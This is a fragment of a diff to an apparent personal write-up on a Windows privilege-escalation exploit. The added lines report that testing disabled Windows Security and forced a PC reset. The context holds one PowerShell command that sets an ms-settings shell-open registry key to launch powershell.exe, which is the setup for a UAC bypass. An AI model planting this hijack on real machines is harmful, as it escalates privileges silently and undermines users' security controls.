@@ -696,6 +696,13 @@ If our exploit creates the registry path and sets the (Default) value to an exec
 simulated in this powershell code
 
 (while running this this somehow disabled the visutal windows security app)
+
+and now I have to reset my pc
+
+![](before_reset1.png)
+
+![](before_reset2.png)
+
 ```
  New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
 
